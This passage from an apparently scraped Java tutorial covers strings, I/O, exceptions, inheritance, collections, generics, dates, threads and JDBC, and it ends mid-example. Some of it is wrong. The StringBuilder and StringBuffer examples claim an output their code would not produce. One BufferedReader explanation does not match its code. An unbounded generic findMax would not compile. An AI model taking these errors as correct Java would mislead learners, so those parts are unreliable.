Checks if the string ends with the specified suffix. Here\u0026#39;s an example of using these methods: ```java char myChar = \u0026#39;7\u0026#39;; boolean isDigit = Character.isDigit(myChar); boolean isLetter = Character.isLetter(myChar); isWhitespace = Character.isWhitespace(myChar); char lowercase = Character.toLowerCase(myChar); char uppercase = Character.toUpperCase(myChar); Java StringTokenizer The java.util.StringTokenizer class in Java is used to split a string into a sequence of tokens or substrings. It provides a simple way to break down a string into smaller parts based on specified delimiter characters. This is particularly useful when working with text data that is structured using delimiters, such as CSV (Comma-Separated Values) or other similar formats.\nBasic Usage To use the StringTokenizer class, you typically follow these steps:\nCreate a StringTokenizer object, passing the input string and the delimiter(s) as arguments to its constructor. Use methods like nextToken() to retrieve the next token in the sequence. Use the hasMoreTokens() method to check if there are more tokens left in the string. Here\u0026rsquo;s a simple example:\nimport java.util.StringTokenizer; public class StringTokenizerExample { public static void main(String[] args) { String input = \u0026#34;apple,banana,orange\u0026#34;; StringTokenizer tokenizer = new StringTokenizer(input, \u0026#34;,\u0026#34;); while (tokenizer.hasMoreTokens()) { String token = tokenizer.nextToken(); System.out.println(\u0026#34;Token: \u0026#34; + token); } } }\rIn this example, the input string is split into tokens using a comma (\u0026rdquo;,\u0026rdquo;) as the delimiter. The hasMoreTokens() method is used to loop through all the tokens, and nextToken() retrieves each token.\nDelimiters and Custom Delimiters By default, StringTokenizer uses space and tab characters as delimiters. However, you can specify custom delimiters when creating a StringTokenizer object. For example, you can use a comma, semicolon, or any character as a delimiter, as shown in the previous example.\nCount Tokens You can use the countTokens() method to get the total number of tokens in the string without actually retrieving them. This can be useful if you need to know how many tokens are in the input string.\nint tokenCount = tokenizer.countTokens(); System.out.println(\u0026#34;Total Tokens: \u0026#34; + tokenCount);\rUsing StringTokenizer with String.split() While StringTokenizer is a simple way to split a string, in modern Java, it\u0026rsquo;s common to use the split() method from the String class to achieve the same result:\nString input = \u0026#34;apple,banana,orange\u0026#34;; String[] tokens = input.split(\u0026#34;,\u0026#34;); for (String token : tokens) { System.out.println(\u0026#34;Token: \u0026#34; + token); }\rThe split() method provides more flexibility and is preferred in most cases.\nStringBuilder StringBuilder is part of the Java Standard Library and is not synchronized, which means it\u0026rsquo;s not thread-safe. However, it offers better performance than StringBuffer. You typically use StringBuilder when you need to perform string manipulation in a single-threaded environment.\nBasic Usage Here\u0026rsquo;s how you can use StringBuilder:\nStringBuilder sb = new StringBuilder(\u0026#34;Hello\u0026#34;); sb.append(\u0026#34; World\u0026#34;); // Appends \u0026#34; World\u0026#34; to the StringBuilder sb.insert(5, \u0026#34; Java\u0026#34;); // Inserts \u0026#34; Java\u0026#34; at index 5 sb.delete(6, 11); // Deletes characters from index 6 to 10 String result = sb.toString(); // Converts StringBuilder to a String System.out.println(result); // Output: \u0026#34;Hello Java World\u0026#34;`\rStringBuffer StringBuffer is also part of the Java Standard Library, but it is synchronized, making it thread-safe. You typically use StringBuffer when you need to perform string manipulation in a multi-threaded environment.\nBasic Usage Here\u0026rsquo;s how you can use StringBuffer:\nStringBuffer sb = new StringBuffer(\u0026#34;Hello\u0026#34;); sb.append(\u0026#34; World\u0026#34;); // Appends \u0026#34; World\u0026#34; to the StringBuffer sb.insert(5, \u0026#34; Java\u0026#34;); // Inserts \u0026#34; Java\u0026#34; at index 5 sb.delete(6, 11); // Deletes characters from index 6 to 10 String result = sb.toString(); // Converts StringBuffer to a String System.out.println(result); // Output: \u0026#34;Hello Java World\u0026#34;`\rBufferedReader and Scanner in Java Introduction BufferedReader and Scanner are two classes in Java that are commonly used for reading input from various sources, such as files, console input, or other streams. They offer different features and are suitable for different use cases.\nBufferedReader BufferedReader is part of the java.io package and is primarily used for reading text from character input streams, such as files or network connections. It provides efficient reading by buffering the input. Here\u0026rsquo;s how to use it:\nimport java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; public class BufferedReaderUserInput { public static void main(String[] args) { try (BufferedReader br = new BufferedReader(new InputStreamReader(System.in))) { System.out.print(\u0026#34;Enter something: \u0026#34;); String userInput = br.readLine(); System.out.println(\u0026#34;You entered: \u0026#34; + userInput); } catch (IOException e) { e.printStackTrace(); } } }\rIn this example, we open a file named \u0026ldquo;example.txt\u0026rdquo; and use a BufferedReader to efficiently read lines from the file.\nScanner Scanner is also part of the java.util package and is a versatile class used for parsing primitive types and strings from various input sources. It\u0026rsquo;s commonly used to read input from the console or process formatted text data. Here\u0026rsquo;s how to use it:\nimport java.util.Scanner; public class ScannerExample { public static void main(String[] args) { Scanner scanner = new Scanner(System.in); System.out.print(\u0026#34;Enter a number: \u0026#34;); int number = scanner.nextInt(); System.out.println(\u0026#34;You entered: \u0026#34; + number); scanner.close(); } }\rIn this example, we create a Scanner object to read user input from the console. We then parse the input as an integer.\nDifferences BufferedReader is more efficient for reading large amounts of text, especially when reading from files, as it reads data in larger chunks (buffers).\nScanner is more versatile and can handle various data types. It\u0026rsquo;s useful for parsing structured data from various sources.\nBufferedReader is suitable for reading lines of text, while Scanner is designed for tokenizing input, making it a better choice when dealing with formatted text.\nUse Cases Use BufferedReader when you need to efficiently read text data from files or character input streams. Use Scanner when you need to parse different types of data from various sources, such as user input or structured data.\nJava Exception Handling Exception handling is an essential aspect of Java programming. In Java, an exception is an event that disrupts the normal flow of a program. When an exception occurs, it can be handled to prevent your program from crashing. Java provides a robust mechanism for handling exceptions through the use of the try, catch, finally, and throw keywords.\nWhat is an Exception? An exception is an abnormal or erroneous condition that occurs during the execution of a program. It can be caused by a variety of reasons, such as invalid input, unexpected events, or runtime errors. Exceptions can be categorized into two main types:\nChecked Exceptions: These are exceptions that are checked at compile time. This means you must explicitly handle them using try and catch blocks or declare them using the throws keyword in the method signature. Examples of checked exceptions include IOException, SQLException, and ClassNotFoundException.\nUnchecked Exceptions (Runtime Exceptions): These exceptions are not checked at compile time and can occur during the program\u0026rsquo;s execution. They typically indicate programming errors, such as dividing by zero, accessing an array index out of bounds, or trying to cast an object to an incompatible type. Examples include ArithmeticException, ArrayIndexOutOfBoundsException, and NullPointerException.\nThe try-catch Block In Java, you can handle exceptions using the try-catch block. The try block contains the code that may throw an exception, while the catch block contains the code to handle the exception.\ntry { // Code that may throw an exception } catch (ExceptionType e) { // Handle the exception }\rHere\u0026rsquo;s an example:\ntry { int result = 10 / 0; // This will throw an ArithmeticException } catch (ArithmeticException e) { System.out.println(\u0026#34;An arithmetic exception occurred: \u0026#34; + e.getMessage()); }\rThe finally Block The finally block is used to execute code that needs to run regardless of whether an exception occurs or not. It is typically used for resource cleanup, such as closing files or network connections.\ntry { // Code that may throw an exception } catch (ExceptionType e) { // Handle the exception } finally { // Cleanup code }\rThrowing Exceptions You can also explicitly throw exceptions using the throw keyword. This is useful when you want to indicate an exceptional condition in your code.\npublic void validateAge(int age) { if (age \u0026lt; 0) { throw new IllegalArgumentException(\u0026#34;Age cannot be negative\u0026#34;); } }\rHandling Multiple Exceptions You can handle multiple exceptions in a try-catch block by using multiple catch blocks for different exception types.\ntry { // Code that may throw an exception } catch (IOException e) { // Handle an IOException } catch (SQLException e) { // Handle an SQLException } catch (Exception e) { // Handle other exceptions }\rException Hierarchy All exceptions in Java are subclasses of the java.lang.Throwable class. The Throwable class has two main subclasses: java.lang.Error and java.lang.Exception. Error is used to represent serious errors that are not usually recoverable, while Exception is used for exceptions that can be caught and handled.\nBest Practices for Exception Handling Catch exceptions at the appropriate level of your program. Use specific exception types whenever possible to provide meaningful error messages. Do not catch exceptions if you can\u0026rsquo;t handle them effectively. Always close resources in a finally block. Document your exceptions using comments or Javadoc. Exception handling is an important part of writing reliable and robust Java programs. By following best practices and understanding how to use try, catch, finally, and throw, you can effectively manage and respond to exceptions in your code.\nInheritance in Java Inheritance is a fundamental concept in object-oriented programming, and it plays a crucial role in Java. It allows you to create a new class (subclass or derived class) that inherits properties and behaviors from an existing class (superclass or base class). In Java, inheritance helps in code reusability, structuring your classes, and modeling relationships between objects.\nSuperclass and Subclass Superclass (Base Class): This is the class from which another class inherits properties and behaviors. It is also known as the parent class.\nSubclass (Derived Class): This is the class that inherits properties and behaviors from the superclass. It is also known as the child class.\nSyntax for Inheritance In Java, you can establish an inheritance relationship using the extends keyword:\nclass Superclass { // Superclass members } class Subclass extends Superclass { // Subclass members }\rHere\u0026rsquo;s a simple example:\nclass Animal { String name; void eat() { System.out.println(name + \u0026#34; is eating.\u0026#34;); } } class Dog extends Animal { void bark() { System.out.println(name + \u0026#34; is barking.\u0026#34;); } }\rIn this example, Dog is a subclass of Animal. The Dog class inherits the name field and the eat method from the Animal class and adds its own bark method.\nAccess Modifiers and Inheritance In Java, access modifiers play a crucial role in inheritance. They control the visibility and accessibility of members (fields and methods) in the superclass and subclasses. There are four access modifiers:\nPublic: Members with the public modifier are accessible from any class.\nProtected: Members with the protected modifier are accessible within the same package and by subclasses, even if they are in a different package.\nDefault (no modifier): Members with no modifier are accessible only within the same package.\nPrivate: Members with the private modifier are accessible only within the same class.\nOverriding Methods In Java, a subclass can provide its own implementation for a method inherited from the superclass. This is called method overriding. To override a method, the subclass method must have the same name, return type, and parameters as the superclass method.\nclass Animal { void makeSound() { System.out.println(\u0026#34;Some generic animal sound.\u0026#34;); } } class Dog extends Animal { @Override void makeSound() { System.out.println(\u0026#34;Bark!\u0026#34;); } }\rHere, the Dog class overrides the makeSound method from the Animal class.\nThe super Keyword The super keyword is used to refer to the superclass\u0026rsquo;s members (fields or methods) from within the subclass. It is often used when you want to call the superclass constructor or access a superclass method or field.\nclass Animal { void eat() { System.out.println(\u0026#34;Animal is eating.\u0026#34;); } } class Dog extends Animal { void eat() { super.eat(); // Calls the eat method from the superclass System.out.println(\u0026#34;Dog is eating.\u0026#34;); } }\rMultiple Inheritance Java supports single inheritance only, meaning a class can inherit from a single superclass. However, a class can implement multiple interfaces, allowing it to inherit method signatures from multiple sources.\nInterfaces in Java In Java, an interface is a blueprint for a class that defines a set of abstract methods (methods without implementations) that must be implemented by any class that implements the interface. Interfaces provide a way to achieve multiple inheritance and define a common set of methods that can be implemented by different classes.\nDeclaring an Interface To declare an interface in Java, you use the interface keyword:\ninterface MyInterface { // Method signatures (abstract methods) go here }\rAbstract Methods Interfaces contain method signatures (abstract methods) without any method body. Subclasses that implement an interface must provide concrete implementations for all the abstract methods defined in the interface.\ninterface MyInterface { void method1(); int method2(String input); }\rIn this example, MyInterface defines two abstract methods: method1() and method2(). Any class that implements this interface must provide implementations for both of these methods.\nImplementing an Interface To implement an interface, a class uses the implements keyword:\nclass MyClass implements MyInterface { @Override public void method1() { // Implementation for method1 } @Override public int method2(String input) { // Implementation for method2 return input.length(); } }\rHere, MyClass implements the MyInterface interface and provides concrete implementations for both method1() and method2().\nMultiple Interface Implementation A class in Java can implement multiple interfaces, allowing it to inherit method signatures from several sources. This is a way to achieve a form of multiple inheritance.\ninterface InterfaceA { void methodA(); } interface InterfaceB { void methodB(); } class MyClass implements InterfaceA, InterfaceB { @Override public void methodA() { // Implementation for methodA } @Override public void methodB() { // Implementation for methodB } }\rHere, MyClass implements both InterfaceA and InterfaceB.\nDefault Methods In Java 8 and later, interfaces can have default methods, which provide a default implementation for a method. Classes that implement the interface can use the default implementation or override it if needed. Default methods are marked with the default keyword.\ninterface MyInterface { void method1(); default void method2() { System.out.println(\u0026#34;Default implementation of method2\u0026#34;); } }\rStatic Methods Interfaces can also have static methods, which are defined using the static keyword. Static methods are associated with the interface itself, not with any particular instance of the interface.\ninterface MyInterface { void method1(); static void staticMethod() { System.out.println(\u0026#34;Static method in MyInterface\u0026#34;); } }\rUse Cases Interfaces are commonly used for:\nDefining contracts: Interfaces define a contract that implementing classes must adhere to, ensuring a consistent API.\nAchieving multiple inheritance: Java classes can implement multiple interfaces, allowing them to inherit behavior from multiple sources.\nCreating plug-in architectures: Interfaces can be used to define plug-in points in an application, where different implementations can be provided.\nPromoting loose coupling: By programming to interfaces rather than concrete classes, you can achieve more flexible and maintainable code.\nLists in Java In Java, a list is an ordered collection of elements where each element has a unique index. Lists allow duplicate elements, and you can access elements by their position in the list. Lists are part of the Java Collections Framework and provide a wide range of operations for working with ordered collections of objects.\nCommon List Interfaces and Classes List Interface The List interface is the core interface for lists in Java. Implementations of the List interface include ArrayList, LinkedList, and others. ArrayList ArrayList is one of the most commonly used list implementations in Java. It uses a dynamically resizable array to store elements. Provides efficient random access but is less efficient for insertions and deletions in the middle. LinkedList LinkedList is another implementation of the List interface. It uses a doubly-linked list to store elements. Provides efficient insertions and deletions but is less efficient for random access. Creating and Using Lists Creating a List To create a list in Java, you can use the List interface and instantiate it with an implementing class like ArrayList:\nList\u0026lt;String\u0026gt; myList = new ArrayList\u0026lt;\u0026gt;();\rAdding Elements You can add elements to a list using the add() method:\nmyList.add(\u0026#34;Apple\u0026#34;); myList.add(\u0026#34;Banana\u0026#34;); myList.add(\u0026#34;Cherry\u0026#34;);\rAccessing Elements Access elements in a list by their index:\nString fruit = myList.get(1); // Retrieves the second element (index 1)\rIterating Through a List You can use various methods to iterate through a list, such as a for loop or an iterator:\nfor (String item : myList) { System.out.println(item); } Iterator\u0026lt;String\u0026gt; iterator = myList.iterator(); while (iterator.hasNext()) { String item = iterator.next(); System.out.println(item); }\rRemoving Elements You can remove elements from a list using the remove() method:\nmyList.remove(\u0026#34;Banana\u0026#34;); // Removes the element \u0026#34;Banana\u0026#34;\rList Operations Lists offer various operations like adding, removing, and searching for elements. You can use methods like add(), remove(), contains(), and others to manipulate the list.\nmyList.add(\u0026#34;Orange\u0026#34;); // Adds an element myList.remove(\u0026#34;Cherry\u0026#34;); // Removes an element boolean hasBanana = myList.contains(\u0026#34;Banana\u0026#34;); // Checks if an element exists int size = myList.size(); // Returns the size of the list\rList and Generics You can specify the type of elements a list can hold using generics, which provides type safety:\nList\u0026lt;Integer\u0026gt; numbers = new ArrayList\u0026lt;\u0026gt;(); numbers.add(10); numbers.add(20); int firstNumber = numbers.get(0); // No casting required\rList vs. Set Lists allow duplicate elements and maintain their order, while sets do not allow duplicates and do not guarantee order.\nCollections in Java - A Comprehensive Guide What are Collections in Java? In Java, collections are a fundamental part of the language and provide a way to store, manipulate, and retrieve groups of objects. Java\u0026rsquo;s Collections Framework is a set of classes and interfaces that offer a wide variety of data structures, such as lists, sets, maps, and queues, to cater to different requirements.\nCommon Collection Interfaces List:\nA list is an ordered collection of elements where duplicate elements are allowed. It is based on an index, and elements can be accessed by their position. Set:\nA set is a collection that does not allow duplicate elements. It does not maintain the order of elements. Map:\nA map is a collection that stores key-value pairs, where each key is associated with a value. Each key is unique in the map. Queue:\nA queue is a collection designed for holding elements before processing. It follows the FIFO (First-In, First-Out) principle. Common Collection Classes ArrayList:\nAn implementation of the List interface that uses a dynamically resizable array to store elements. It\u0026rsquo;s efficient for random access but less efficient for insertion and deletion. LinkedList:\nA List implementation that uses a doubly-linked list to store elements. It\u0026rsquo;s efficient for insertion and deletion but less efficient for random access. HashSet:\nAn implementation of the Set interface that uses a hash table to store elements. It does not allow duplicate elements. TreeSet:\nA Set implementation that uses a Red-Black tree to store elements. It maintains elements in sorted order. HashMap:\nAn implementation of the Map interface that uses a hash table to store key-value pairs. It allows fast retrieval based on the key. TreeMap:\nA Map implementation that uses a Red-Black tree to store key-value pairs. It maintains key-value pairs in sorted order based on the keys. Collection Methods and Operations Collections in Java provide a wide range of methods for performing operations such as adding, removing, searching, and iterating over elements. Some common methods include add(), remove(), contains(), size(), and iterator().\nCollections Framework Hierarchy The Collections Framework in Java is organized hierarchically. The core interface Collection is the root of the hierarchy, and it\u0026rsquo;s extended by various sub-interfaces, including List, Set, and Queue. These sub-interfaces are implemented by various classes, providing a rich set of collection types to choose from.\nGenerics in Collections Generics allow you to specify the type of elements a collection can hold, providing type safety and eliminating the need for explicit casting.\nList\u0026lt;String\u0026gt; names = new ArrayList\u0026lt;\u0026gt;(); names.add(\u0026#34;Alice\u0026#34;); names.add(\u0026#34;Bob\u0026#34;); String firstPerson = names.get(0); // No casting required\rIterating Over Collections You can iterate over collections using different methods, including the enhanced for loop, iterators, and streams.\nList\u0026lt;String\u0026gt; names = Arrays.asList(\u0026#34;Alice\u0026#34;, \u0026#34;Bob\u0026#34;, \u0026#34;Charlie\u0026#34;); // Using enhanced for loop for (String name : names) { System.out.println(name); } // Using an iterator Iterator\u0026lt;String\u0026gt; iterator = names.iterator(); while (iterator.hasNext()) { String name = iterator.next(); System.out.println(name); } // Using streams (Java 8+) names.stream().forEach(name -\u0026gt; System.out.println(name));\rCollections and Thread Safety Java\u0026rsquo;s standard collections are not thread-safe. If multiple threads need to access a collection concurrently, you should consider using thread-safe alternatives like ConcurrentHashMap or using synchronization mechanisms\nFile Handling and Input/Output (I/O) in Java Java provides a comprehensive set of classes and libraries for file handling and input/output operations. These classes allow you to read from and write to files, directories, and streams. Here\u0026rsquo;s an overview of file handling and I/O in Java:\nReading and Writing Text Files Reading a Text File You can read the contents of a text file using classes like FileReader and BufferedReader:\ntry (BufferedReader br = new BufferedReader(new FileReader(\u0026#34;file.txt\u0026#34;))) { String line; while ((line = br.readLine()) != null) { System.out.println(line); } } catch (IOException e) { e.printStackTrace(); }\rWriting to a Text File To write to a text file, you can use classes like FileWriter and BufferedWriter:\ntry (BufferedWriter bw = new BufferedWriter(new FileWriter(\u0026#34;output.txt\u0026#34;))) { bw.write(\u0026#34;Hello, World!\u0026#34;); } catch (IOException e) { e.printStackTrace(); }\rReading and Writing Binary Files Reading a Binary File To read binary files, you can use classes like FileInputStream and DataInputStream:\ntry (DataInputStream dis = new DataInputStream(new FileInputStream(\u0026#34;data.bin\u0026#34;))) { int value = dis.readInt(); System.out.println(\u0026#34;Read value: \u0026#34; + value); } catch (IOException e) { e.printStackTrace(); }\rWriting to a Binary File To write binary data, you can use classes like FileOutputStream and DataOutputStream:\ntry (DataOutputStream dos = new DataOutputStream(new FileOutputStream(\u0026#34;data.bin\u0026#34;))) { dos.writeInt(42); } catch (IOException e) { e.printStackTrace(); }\rFile and Directory Operations You can perform various file and directory operations, such as creating, deleting, renaming, and listing files and directories:\nFile file = new File(\u0026#34;example.txt\u0026#34;); // Check if a file exists boolean exists = file.exists(); // Create a new file boolean created = file.createNewFile(); // Delete a file boolean deleted = file.delete(); // Rename a file File newFile = new File(\u0026#34;new_name.txt\u0026#34;); boolean renamed = file.renameTo(newFile); // List files in a directory File directory = new File(\u0026#34;/path/to/directory\u0026#34;); File[] files = directory.listFiles();\rWorking with Directories To work with directories, you can use the File class and its methods:\nFile directory = new File(\u0026#34;my_directory\u0026#34;); // Create a directory boolean created = directory.mkdir(); // List files and subdirectories in a directory File[] contents = directory.listFiles(); // Delete a directory (only if it\u0026#39;s empty) boolean deleted = directory.delete();\rFile Streams You can use various stream classes to perform I/O operations, such as FileInputStream, FileOutputStream, BufferedInputStream, and BufferedOutputStream.\ntry (FileInputStream fis = new FileInputStream(\u0026#34;data.txt\u0026#34;); FileOutputStream fos = new FileOutputStream(\u0026#34;output.txt\u0026#34;)) { int data; while ((data = fis.read()) != -1) { fos.write(data); } } catch (IOException e) { e.printStackTrace(); }\rException Handling When working with file I/O, it\u0026rsquo;s important to handle exceptions properly to ensure robust error handling and resource cleanup.\ntry { // File I/O operations } catch (IOException e) { e.printStackTrace(); } finally { // Close resources in the \u0026#34;finally\u0026#34; block }\rSets in Java In Java, a set is a collection that does not allow duplicate elements. Sets are part of the Java Collections Framework and provide a way to store and manage a unique set of elements. There are several set implementations in Java, each with its own characteristics.\nCommon Set Interfaces and Classes Set Interface The Set interface is the core interface for sets in Java. It does not allow duplicate elements. Implementations of the Set interface include HashSet, LinkedHashSet, and TreeSet. HashSet HashSet is one of the most commonly used set implementations in Java. It uses a hash table to store elements. Elements are not stored in any particular order. LinkedHashSet LinkedHashSet is an implementation of the Set interface that maintains the order of elements. It uses a hash table with a linked list to store elements. TreeSet TreeSet is an implementation of the Set interface that stores elements in sorted order. It uses a Red-Black tree data structure to maintain elements in a sorted manner. Creating and Using Sets Creating a Set To create a set in Java, you can use the Set interface and instantiate it with an implementing class like HashSet:\nSet\u0026lt;String\u0026gt; mySet = new HashSet\u0026lt;\u0026gt;();\rAdding Elements You can add elements to a set using the add() method:\nmySet.add(\u0026#34;Apple\u0026#34;); mySet.add(\u0026#34;Banana\u0026#34;); mySet.add(\u0026#34;Cherry\u0026#34;);\rChecking for Duplicate Elements Sets automatically prevent duplicate elements. You can check if an element exists in the set using the contains() method:\nboolean containsBanana = mySet.contains(\u0026#34;Banana\u0026#34;); // true\rRemoving Elements You can remove elements from a set using the remove() method:\nmySet.remove(\u0026#34;Cherry\u0026#34;); // Removes \u0026#34;Cherry\u0026#34; from the set\rIterating Through a Set You can iterate through a set using various methods, such as a for-each loop or an iterator:\nfor (String item : mySet) { System.out.println(item); } Iterator\u0026lt;String\u0026gt; iterator = mySet.iterator(); while (iterator.hasNext()) { String item = iterator.next(); System.out.println(item); }\rSet Operations Sets provide various operations like adding, removing, and checking for elements. Some common methods include add(), remove(), contains(), and size().\nmySet.add(\u0026#34;Orange\u0026#34;); // Adds an element mySet.remove(\u0026#34;Banana\u0026#34;); // Removes an element boolean hasBanana = mySet.contains(\u0026#34;Banana\u0026#34;); // Checks if an element exists int size = mySet.size(); // Returns the size of the set\rSet and Generics You can specify the type of elements a set can hold using generics, providing type safety:\nSet\u0026lt;Integer\u0026gt; numbers = new HashSet\u0026lt;\u0026gt;(); numbers.add(10); numbers.add(20);\rGenerics in Java Generics in Java provide a way to create classes, interfaces, and methods that operate with types as parameters, allowing for more flexible and reusable code. They enable the creation of classes and methods that work with different data types while maintaining type safety at compile time.\nWhy Use Generics? The main benefits of generics include:\nType Safety: Generics ensure that data types are known at compile time, reducing the risk of runtime errors.\nCode Reusability: Generics enable you to create components that can be reused with different data types.\nPerformance: Generics eliminate the need for explicit casting, which can improve performance.\nGeneric Classes You can create generic classes by using angle brackets (\u0026lt;\u0026gt;) to specify the type parameter. Here\u0026rsquo;s an example of a generic class:\npublic class Box\u0026lt;T\u0026gt; { private T value; public T getValue() { return value; } public void setValue(T value) { this.value = value; } }\rYou can use the generic class with various data types:\nBox\u0026lt;Integer\u0026gt; integerBox = new Box\u0026lt;\u0026gt;(); integerBox.setValue(42); int intValue = integerBox.getValue(); Box\u0026lt;String\u0026gt; stringBox = new Box\u0026lt;\u0026gt;(); stringBox.setValue(\u0026#34;Hello, Generics!\u0026#34;); String stringValue = stringBox.getValue();\rGeneric Methods You can create generic methods that work with a specific type or multiple types. Here\u0026rsquo;s an example of a generic method:\npublic \u0026lt;T\u0026gt; T findMax(T[] array) { if (array == null || array.length == 0) { return null; } T max = array[0]; for (T item : array) { if (item.compareTo(max) \u0026gt; 0) { max = item; } } return max; }\rThis method can find the maximum element in an array of any type that implements the Comparable interface.\nInteger[] intArray = {1, 2, 3, 4, 5}; Integer maxInt = findMax(intArray); String[] stringArray = {\u0026#34;apple\u0026#34;, \u0026#34;banana\u0026#34;, \u0026#34;cherry\u0026#34;}; String maxString = findMax(stringArray);\rBounded Type Parameters You can restrict the types that can be used as type parameters by using bounded type parameters. For example, you can specify that a type must implement a specific interface or extend a particular class.\npublic \u0026lt;T extends Comparable\u0026lt;T\u0026gt;\u0026gt; T findMax(T[] array) { // ... }\rIn this example, T must be a type that implements the Comparable interface.\nWildcards Wildcards are used when the exact type is unknown or not relevant. You can use wildcards to make methods more flexible.\n\u0026lt;?\u0026gt;: Unbounded wildcard. Allows reading, but not writing. \u0026lt;? extends T\u0026gt;: Upper bounded wildcard. Allows reading elements of type T or its subtypes. \u0026lt;? super T\u0026gt;: Lower bounded wildcard. Allows writing elements of type T or its supertypes. Date and Duration Handling in Java Java provides the java.util.Date class and related classes in the java.time package to work with dates, times, and durations. In Java 8 and later, the java.time package introduces a more robust and user-friendly way to handle dates and durations.\nWorking with Dates java.util.Date The java.util.Date class represents a specific instant in time. However, it has some limitations and is not recommended for new code. Here\u0026rsquo;s how you can work with it:\nimport java.util.Date; // Creating a Date object with the current date and time Date now = new Date(); // Displaying the date and time System.out.println(now); // Comparing dates Date earlierDate = new Date(0); boolean isBefore = now.before(earlierDate);\rjava.time.LocalDate In Java 8 and later, you can use the java.time.LocalDate class to work with dates without time components. It provides more flexibility and is recommended for date-related operations:\nimport java.time.LocalDate; // Creating a LocalDate with the current date LocalDate today = LocalDate.now(); // Displaying the date System.out.println(today); // Comparing dates LocalDate pastDate = LocalDate.of(2022, 1, 1); boolean isBefore = today.isBefore(pastDate);\rWorking with Durations java.time.Duration The java.time.Duration class represents a duration or a time span between two instants. It\u0026rsquo;s useful for measuring time intervals:\nimport java.time.Duration; import java.time.LocalTime; // Creating a Duration Duration oneHour = Duration.ofHours(1); // Adding a duration to a time LocalTime currentTime = LocalTime.now(); LocalTime oneHourLater = currentTime.plus(oneHour); // Comparing durations Duration halfHour = Duration.ofMinutes(30); boolean isShorter = halfHour.compareTo(oneHour) \u0026lt; 0;\rFormatting and Parsing You can format dates and durations as strings and parse strings into date and duration objects using the DateTimeFormatter class:\nimport java.time.format.DateTimeFormatter; // Formatting a date DateTimeFormatter dateFormatter = DateTimeFormatter.ofPattern(\u0026#34;yyyy-MM-dd\u0026#34;); String formattedDate = today.format(dateFormatter); // Parsing a date LocalDate parsedDate = LocalDate.parse(\u0026#34;2022-12-31\u0026#34;, dateFormatter);\rDealing with Time Zones When working with dates and times, it\u0026rsquo;s essential to consider time zones to handle time differences correctly. The java.time package provides classes like ZoneId and ZonedDateTime for this purpose.\nimport java.time.ZoneId; import java.time.ZonedDateTime; // Creating a ZonedDateTime with a specific time zone ZoneId newYorkZone = ZoneId.of(\u0026#34;America/New_York\u0026#34;); ZonedDateTime newYorkTime = ZonedDateTime.now(newYorkZone);\rThreads in Java Threads in Java are a fundamental part of the language, allowing you to execute multiple tasks concurrently. Java provides built-in support for multithreading through the java.lang.Thread class and the java.util.concurrent package, which includes higher-level constructs for managing threads and synchronization.\nCreating Threads Extending the Thread Class You can create a thread by extending the Thread class and overriding the run() method:\nclass MyThread extends Thread { public void run() { // Code to be executed by the thread } } // Creating and starting a thread MyThread myThread = new MyThread(); myThread.start();\rImplementing the Runnable Interface Another way to create threads is by implementing the Runnable interface and passing it to a Thread object:\nclass MyRunnable implements Runnable { public void run() { // Code to be executed by the thread } } // Creating and starting a thread Thread thread = new Thread(new MyRunnable()); thread.start();\rThread States Threads in Java can be in different states, including:\nNew: A newly created thread that hasn\u0026rsquo;t started yet. Runnable: A thread that is ready to run and waiting for CPU time. Blocked: A thread that is waiting for a resource or a condition. Terminated: A thread that has completed its execution. Thread Synchronization When multiple threads access shared resources, thread synchronization is essential to prevent race conditions and ensure data consistency. Java provides synchronized blocks and methods for this purpose.\nSynchronized Blocks You can use synchronized blocks to control access to critical sections of code:\nsynchronized (lockObject) { // Critical section code }\rSynchronized Methods You can declare methods as synchronized to make them thread-safe:\npublic synchronized void synchronizedMethod() { // Thread-safe code }\rThread Pools Thread pools are a way to manage and reuse threads efficiently. Java\u0026rsquo;s Executor framework provides thread pool support through classes like ExecutorService and ThreadPoolExecutor.\nExecutorService executor = Executors.newFixedThreadPool(5); for (int i = 0; i \u0026lt; 10; i++) { Runnable task = new MyRunnable(); executor.execute(task); } executor.shutdown();\rThread Safety To ensure thread safety, it\u0026rsquo;s important to use synchronization when working with shared data, use thread-safe collections, and handle exceptions properly to avoid crashing threads.\nJava Concurrency Utilities The java.util.concurrent package provides high-level utilities for managing threads, concurrent data structures, and synchronization. This includes classes like CountDownLatch, CyclicBarrier, Semaphore, and ConcurrentHashMap.\nDatabases in Java Java provides robust and versatile ways to interact with databases. You can connect to relational databases, perform SQL queries, and work with different database management systems. In this overview, we\u0026rsquo;ll cover the basic concepts of database access in Java.\nJava Database Connectivity (JDBC) Java Database Connectivity (JDBC) is the Java standard for database-independent connectivity. It allows you to interact with relational databases using Java. JDBC provides a set of interfaces and classes for connecting to a database, executing SQL queries, and managing data.\nSteps for Database Access with JDBC: Load the JDBC Driver: You need to load the appropriate JDBC driver for the database you\u0026rsquo;re working with. This can be done with Class.forName() or using the database-specific driver JAR.\nEstablish a Database Connection: Use a Connection object to establish a connection to the database. The connection string typically includes information like the database URL, username, and password.\nCreate a Statement: You can create Statement or PreparedStatement objects to execute SQL queries.\nExecute SQL Queries: Use the statement to execute SQL queries like SELECT, INSERT, UPDATE, or DELETE.\nProcess Query Results: Retrieve and process the results of your SQL queries, if applicable.\nClose Resources: Close the Statement, Connection, and other resources when you\u0026rsquo;re done to free up system resources.\nExample: import java.sql.Connection; import java.sql.DriverManager; import java.sql.ResultSet; import java.sql.Statement; public class DatabaseAccessExample { public static void main(String[] args) { try { // Load the JDBC driver Class.forName(\u0026#34;com.mysql.cj.jdbc.Driver\u0026#34;); // Establish a database connection String url = \u0026#34;jdbc:mysql://localhost:3306/mydb\u0026#34;; String user = \u0026#34;username\u0026#34;; String password = \u0026#34;password\u0026#34;; Connection connection = DriverManager.getConnection(url, user, password); // Create a statement Statement statement = connection.createStatement(); // Execute an SQL query String query = \u0026#34;SELECT * FROM mytable\u0026#34;; ResultSet resultSet = statement.executeQuery(query); // Process query results while (resultSet.next()) { // Process the data String data = resultSet.getString(\u0026#34;column_name\u0026#34;); System.out.println(data); } // Close resources resultSet.close(); statement.close(); connection.close(); } catch (Exception e) { e.printStackTrace(); } } }\rJava Persistence API (JPA) The Java Persistence API (JPA) is a Java specification for working with databases using object-relational mapping (ORM). It provides a high-level, object-oriented interface for database operations, making it easier to work with databases.\nPopular JPA implementations include Hibernate and EclipseLink.\nExample using Hibernate: import org.hibernate.Session; import org.hibernate.SessionFactory; import org.hibernate.Transaction; import org.hibernate.cfg.Configuration; public class HibernateExample { public static void main(String[] args) { // Create a Hibernate configuration and session Configuration configuration = new Configuration().configure(); SessionFactory 